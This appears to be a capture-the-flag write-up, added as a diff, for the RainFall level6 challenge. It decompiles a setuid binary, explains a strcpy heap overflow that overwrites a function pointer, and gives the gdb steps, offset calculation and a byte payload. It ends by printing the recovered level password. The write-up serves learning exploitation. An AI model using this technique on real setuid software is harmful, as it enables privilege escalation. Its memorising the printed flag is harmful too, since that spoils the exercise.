@@ -1,0 +1,73 @@
+
+```bash
+level6@RainFall:~$ ls -la
+-rwsr-s---+ 1 level7 users  5274 Mar  6  2016 level6
+level6@RainFall:~$ file level6 
+level6: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xb1a5ce594393de0f273c64753cede6da01744479, not stripped
+```
+
+We download it with `scp` and use IDA to reverse it.
+
+```c
+int n(void)
+{
+    return system("/bin/cat /home/user/level7/.pass");
+}
+
+int m(void)
+{
+    return puts("Nope");
+}
+
+int main(int argc, const char **argv, const char **envp)
+{
+    int (**v4)(void);
+    char *v5;
+
+    v5 = (char *)malloc(64);
+    v4 = (int (**)(void))malloc(4);
+    *v4 = m;
+    strcpy(v5, argv[1]);
+    return (*v4)();
+}
+```
+
+We can directly see the problem here `strcpy(v5, argv[1]);` allow user to input any lenght of input
+This is a common heap overflow, first `v5` alloced some memory and just after `v4` alloced memory too
+The problem is because we can write as much as we want in `v5` we can overflow over `v4` heap memory and rewrite the function pointer to point to `n()` and not `m()`
+
+First let's find `n()` and `m()` address:
+```bash
+level6@RainFall:~$ gdb level6
+(gdb) info address n
+Symbol "n" is at 0x8048454 in a file compiled without debugging.
+(gdb) info address m
+Symbol "m" is at 0x8048468 in a file compiled without debugging.
+```
+
+Let's break after `*v4 = m;` to see what the heap look like
+```bash
+b *0x8048495
+b *0x80484aa
+(gdb) run
+(gdb) info register
+eax            0x804a008        134520840
+(gdb) continue
+(gdb) info register
+eax            0x804a050        134520912
+```
+
+We know the return value of `malloc()` for all the call's, we can use it to calculate the padding we need:
+0x804a050 - 0x804a008 = 72u
+
+We can use that to write the playload:
+```bash
+printf 'A%.0s' {1..72} > /tmp/payload_6 # padding
+echo -ne "\x54\x84\x04\x08" >> /tmp/payload_6 # the pointer of n() (0x8048454)
+```
+
+We run it:
+```bash
+level6@RainFall:~$ ./level6 $(cat /tmp/payload_6)
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+```
